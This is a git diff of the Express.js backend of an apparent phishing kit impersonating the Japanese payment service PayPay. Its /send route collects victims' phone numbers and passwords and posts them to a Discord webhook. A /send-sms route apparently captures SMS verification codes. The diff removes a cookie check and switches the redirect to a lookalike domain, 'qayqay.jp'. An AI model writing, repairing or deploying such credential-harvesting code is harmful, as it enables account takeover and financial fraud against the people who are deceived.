@@ -1,44 +1,11 @@
 const express = require("express");
-const path = require("path");
-const cookieParser = require("cookie-parser");
 const app = express();
 const { getAccessLog } = require("./dist/Access");
 
-const webhook = process.env.DISCORD_WEBHOOK;
-
-
 app.use(express.urlencoded({ extended: true }));
-app.use(cookieParser());
+app.use(express.static("."));
 
-app.get(["/", "/index.html", "/login.html"], (req, res) => {
-  if (!req.cookies.pp_session) {
-    res.cookie("pp_session", "1", { httpOnly: true, secure: true, path: "/" });
-  }
-  res.sendFile(path.join(__dirname, "index.html"));
-});
-
-
-app.get("/sms.html", (req, res) => {
-  if (req.cookies.pp_session !== "1") {
-    return res.status(403).send(`
-      <!DOCTYPE html>
-      <html lang="ja">
-      <head><meta charset="UTF-8"><title>403 Forbidden</title></head>
-      <body style="text-align:center; padding:50px; font-family:sans-serif; background:#f7f7f7;">
-        <h1 style="color:#333;">403 Forbidden</h1>
-        <p style="color:#666;">不正なアクセスです。最初からやり直してください。</p>
-      </body>
-      </html>
-    `);
-  }
-  res.sendFile(path.join(__dirname, "sms.html"));
-});
-
-
-app.use(express.static(path.join(__dirname, ".")));
-
-
-
+const webhook = process.env.DISCORD_WEBHOOK;
 
 app.post("/send", async (req, res) => {
   const phone = req.body.name;
@@ -48,9 +15,9 @@ app.post("/send", async (req, res) => {
   const safePassword = typeof password === 'string' ? password : '';
   const cleanPhone = safePhone.replace(/[- ]/g, '');
 
-  
+  // 元のバリデーションとリダイレクト先を維持
   if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
-    return res.redirect("/index.html?error=1");
+    return res.redirect("/login.html?error=1");
   }
 
   try {
@@ -62,7 +29,7 @@ app.post("/send", async (req, res) => {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        // 送信データもsafePasswordに統一（元のpasswordから修正）
+        // passwordではなくsafePasswordを使用
         content: `\ntel: ${cleanPhone}\npass: ${safePassword}`
       })
     });
@@ -73,7 +40,6 @@ app.post("/send", async (req, res) => {
       console.log("送信成功");
     }
 
-    res.cookie("pp_session", "1", { httpOnly: true, secure: true, path: "/" });
     const telParam = phone ? `?tel=${encodeURIComponent(phone)}` : '';
     res.redirect(`/sms.html${telParam}`);
 
@@ -111,7 +77,7 @@ app.post("/send-sms", async (req, res) => {
       console.log("sms送信成功");
     }
     
-    res.redirect("https://qay-payqay.up.railway.app/sms.html?error=2"); 
+    res.redirect("https://qayqay.jp/sms.html?error=2"); 
 
   } catch (error) {
     console.error("sms送信失敗:", error);
@@ -129,7 +95,9 @@ app.post("/log-access", async (req, res) => {
 
     const response = await fetch(accessWebhook, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify({ content: logMessage })
     });
 
